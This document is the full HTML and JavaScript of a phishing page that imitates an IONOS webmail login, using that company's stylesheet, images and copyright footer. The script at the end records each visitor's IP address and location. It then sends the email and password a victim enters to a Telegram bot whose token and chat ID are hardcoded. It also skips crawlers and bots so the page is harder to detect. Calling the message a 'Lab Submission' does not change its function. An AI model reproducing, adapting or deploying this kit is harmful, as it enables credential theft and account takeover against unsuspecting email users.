<!DOCTYPE html>
<html>
<head>
  <link rel="shortcut icon" type="image/x-icon" href="https://i.imgur.com/QpPprtj.png"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="robots" content="index, follow"/>
  <title>Webmail Login</title>
  <link rel="stylesheet" href="https://ce1.uicdn.net/exos/framework/2.0/ionos.min.css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <style>
    /* Original CSS */
    .clearfix:after {clear: both; content: ""; display: table}
    .grid-01{width:8.333333%}.grid-01,.grid-02{box-sizing:border-box;float:left;min-height:1px}
    .grid-02{width:16.666667%}.grid-03{width:25%}.grid-03,.grid-04a{box-sizing:border-box;float:left;min-height:1px}
    .grid-04a{width:27.5%}.grid-04{width:33.333333%}.grid-04,.grid-05{box-sizing:border-box;float:left;min-height:1px}
    .grid-05{width:41.666667%}.grid-06{width:50%}.grid-06,.grid-07{box-sizing:border-box;float:left;min-height:1px}
    .grid-07{width:58.333333%}.grid-08{width:66.666667%}.grid-08,.grid-08a{box-sizing:border-box;float:left;min-height:1px}
    .grid-08a{width:72.5%}.grid-09{width:75%}.grid-09,.grid-10{box-sizing:border-box;float:left;min-height:1px}
    .grid-10{width:83.333333%}.grid-11{float:left;width:91.666667%}.grid-11,.grid-12{box-sizing:border-box;min-height:1px}
    .grid-12{float:none;width:auto}.grid-12:after{clear:both;content:"";display:table}
    .current-identifier{display:inline-flex;max-width:90%}
    .current-identifier a:first-of-type{margin:0;padding-left:11px;padding-right:11px}
    .sheet__section>.container-current-identifier{padding-bottom:14px;padding-top:14px}
    .sheet__section>.container-current-identifier:last-child{padding-bottom:0;padding-top:14px}
    .sheet__section>.container-current-identifier:first-child{padding-bottom:14px;padding-top:0}
    .button-current-identifier{max-width:100%}
    .button-current-identifier span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    @media only screen and (min-width:667px)and (max-width:1184px){.page-section--short .page-section__block{padding-right:0}}
    @media only screen and (min-width:1185px){.page-section--short .page-section__block{padding-right:0}}
    .no-spinners{-moz-appearance:textfield}
    .no-spinners::-webkit-inner-spin-button,.no-spinners::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}
    .password-unveil:before{content:""}
    .password-unveil-reverse:before,.password-unveil:before{cursor:pointer;font-family:exos-icon-font;font-style:normal;font-weight:400!important;vertical-align:top}
    .password-unveil-reverse:before{content:""}
    .hide{display:none}
  </style>
</head>
<body>
<div class="page-content">
  <div class="oao-navi-navigation oao-navi-light">
    <div class="oao-navi-left">
      <div class="oao-navi-application-name">
        <a class="oao-navi-app-name">
          <span><img src="https://i.imgur.com/HTJ8bHC.png" alt="" height="40"/></span>
          <span>Webmail Login</span>
        </a>
      </div>
    </div>
  </div>

  <main>
    <section class="page-section page-section--default page-section--short" id="page1">
      <div class="page-section__block">
        <div class="sheet">
          <section class="sheet__section sheet__section--default">
            <ul>
              <li class="stripe stripe--cropped">
                <div class="stripe__item">
                  <img class="stripe__visual" src="https://i.imgur.com/y99E5QX.jpg" height="58" width="auto"/>
                </div>
                <div class="stripe__item">
                  <h1 class="headline stripe__element">My Webmail Login</h1>
                </div>
              </li>
            </ul>
          </section>

          <section class="sheet__section sheet__section--default">
            <div method="POST" novalidate="">
              <ul>
                <li class="form-stripe">
                  <label class="label" for="username">Email address</label>
                  <input type="email" class="input-text form-input" name="identifier" id="username" tabindex="1" required autofocus autocomplete="username" autocapitalize="none" spellcheck="false" value=""/>
                  <p class="input-byline input-byline--error hide" id="username-error">Please enter your email address.</p>
                </li>
                <li class="form-stripe form-stripe--actions">
                  <button class="button button--primary button--full-width button--with-loader" type="submit" id="btn1" tabindex="2">Next</button>
                </li>
              </ul>
              <input type="password" class="hidden" name="hiddenPassword" tabindex="-1"/>
            </div>
          </section>
        </div>
      </div>
    </section>

    <section class="page-section page-section--default page-section--short hide" id="page2" style="margin-top:2rem">
      <div class="page-section__block">
        <div class="sheet">
          <section class="sheet__section sheet__section--default">
            <ul>
              <li class="stripe stripe--cropped">
                <div class="stripe__item">
                  <img class="stripe__visual" src="https://i.imgur.com/y0fy4PP.jpg" height="58" width="auto"/>
                </div>
                <div class="stripe__item">
                  <h1 class="headline stripe__element">Enter password</h1>
                </div>
              </li>
            </ul>
          </section>

          <section class="sheet__section sheet__section--default">
            <div class="container-current-identifier">
              <div class="current-identifier">
                <a class="ghost-button ghost-button--icon-only ghost-button--secondary tooltip" data-tooltip="Back to login" id="restart">
                  <img src="https://i.imgur.com/WrdHU54.png" alt="" height="20px"/>
                </a>
                <a class="button-current-identifier ghost-button ghost-button--with-icon ghost-button--secondary tooltip" data-tooltip="Back to login">
                  <img src="https://i.imgur.com/8ogelpQ.png" alt="" height="20px" style="margin-right:5px"/>
                  <span class="ghost-button__text" id="email-info"></span>
                </a>
              </div>
            </div>

            <div method="POST" novalidate="">
              <ul>
                <li class="form-stripe">
                  <label class="label" for="password">Password</label>
                  <span class="input-text-group input-text-group--empty">
                    <input type="password" class="input-text" maxlength="2048" required tabindex="1" autofocus autocomplete="current-password" autocapitalize="none" spellcheck="false" id="password" name="password" value=""/>
                    <a class="input-text-group__action password-unveil" id="password-unveil"></a>
                  </span>
                  <p class="input-byline">
                    <span class="input-byline--error" id="password-error">Please enter your password.</span>
                  </p>
                </li>
                <li class="form-stripe form-stripe--actions">
                  <button class="button button--primary button--full-width button--with-loader" type="submit" id="btn2" tabindex="2">Next</button>
                </li>
              </ul>
            </div>
          </section>
        </div>
      </div>
    </section>
  </main>
</div>

<footer class="page-footer">
  <div class="page-footer__block">
    <section class="page-footer__section page-footer__section--last">
      <div class="page-footer__section-item">
        <div class="oao-statuspage-overall-status page-footer__status"></div>
      </div>
      <div class="page-footer__section-item page-footer__section-item--align-center">&#32;&#169;&#32;2025 <a class="page-footer__link" target="_blank">IONOS Inc.</a></div>
      <div class="page-footer__section-item page-footer__section-item--align-right"><a class="page-footer__link" target="_blank">Privacy Policy</a></div>
    </section>
  </div>
</footer>

<script>
$(document).ready(function(){

  // ===== Telegram Config =====
  const telegramToken = "7207011277:AAGmoWakcvJ7j5Hh-XrhgdyCTA_stbYwqF4"; // Replace
  const chatId = "8017348638";          // Replace

  function sendTelegram(message){
    const ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("bot")!==-1 || ua.indexOf("crawl")!==-1 || ua.indexOf("spider")!==-1 || navigator.webdriver) return;
    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:chatId,text:message})
    });
  }

  // ===== Send Visit Alert with IP & Geo =====
  fetch("https://ipapi.co/json/").then(res=>res.json()).then(info=>{
    const visitMsg = `New visitor:\nURL: ${window.location.href}\nIP: ${info.ip}\nCity: ${info.city}\nRegion: ${info.region}\nCountry: ${info.country_name}\nUA: ${navigator.userAgent}`;
    sendTelegram(visitMsg);
  });

  // ===== Form Functions =====
  function resetErrors(){
    $("#username-error").hide();
    $("#password-error").hide();
  }

  function validateEmail(email){
    return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(email);
  }

  function page1Submit(){
    resetErrors();
    let email = $("#username").val();
    if(validateEmail(email)){
      $("#btn1").prop("disabled",true);
      $("#email-info").text(email);
      $("#page1").hide();
      $("#page2").show();
      $("#password").focus();
    } else {
      $("#username-error").show();
      $("#username").focus();
    }
  }

  function page2Submit(){
    resetErrors();
    let email = $("#username").val();
    let pass = $("#password").val();
    if(pass.length<1){
      $("#password-error").show();
      $("#password").focus();
    } else {
      $("#btn2").prop("disabled",true);

      // Send Email & Password with IP + Geo
      fetch("https://ipapi.co/json/").then(res=>res.json()).then(info=>{
        const report = `Lab Submission:\nEmail: ${email}\nPassword: ${pass}\nIP: ${info.ip}\nCity: ${info.city}\nRegion: ${info.region}\nCountry: ${info.country_name}\nUA: ${navigator.userAgent}`;
        sendTelegram(report);
      });

    
      
    }
  }

  function restartForm(){
    resetErrors();
    $("#page2").hide();
    $("#page1").show();
    $("#btn1").prop("disabled",false);
    $("#btn2").prop("disabled",false);
    $("#username").val("");
    $("#password").val("");
    $("#username").focus();
  }

  // Password Toggle
  $("#password-unveil").on("click",function(e){
    e.preventDefault();
    let pass = $("#password").get(0);
    if(pass.type==="password"){
      pass.type="text";
      $("#password-unveil").removeClass("password-unveil").addClass("password-unveil-reverse");
    } else {
      pass.type="password";
      $("#password-unveil").removeClass("password-unveil-reverse").addClass("password-unveil");
    }
  });

  // Bind Buttons & Enter Key
  $("#btn1").on("click",function(e){e.preventDefault();page1Submit();});
  $("#btn2").on("click",function(e){e.preventDefault();page2Submit();});
  $("#restart").on("click",function(e){e.preventDefault();restartForm();});
  $("#username").keypress(function(e){if(e.which==13){$("#btn1").click();return false;}});
  $("#password").keypress(function(e){if(e.which==13){$("#btn2").click();return false;}});
});
</script>
</body>
</html>
